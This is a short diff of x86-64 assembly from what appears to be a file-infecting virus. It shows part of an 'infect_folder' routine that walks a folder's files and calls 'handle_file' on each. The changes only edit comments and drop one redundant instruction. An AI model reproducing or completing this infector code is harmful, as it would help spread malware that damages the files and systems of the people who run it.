@@ -512,7 +512,7 @@ infect_folder proc ; parametres : char *folder_name, void *buffer, size of buffe
 
 		mov [rsp + 32], rcx
 
-		mov rcx, [rsp + 32]
+		; First parameter already in rcx.
 		lea rdx, [rsp + 40]
 
 		test BYTE ptr [MUST_EXIT], 1
@@ -540,7 +540,7 @@ end_find_next_file:
 		je loop_end
 
 		lea rcx, [rsp + 400]
-		lea rdx, TMP_1_NAME
+		lea rdx, TMP_1_NAME ; /!\ : Le nom est en dur 
 		mov r8, 128
 		call ft_strncpy
 
@@ -556,7 +556,7 @@ end_find_next_file:
 		je loop_start
 
 		mov rcx, rax 
-		call handle_file
+		call handle_file ; handle_file(handle)
 
 		jmp loop_start
 loop_end:
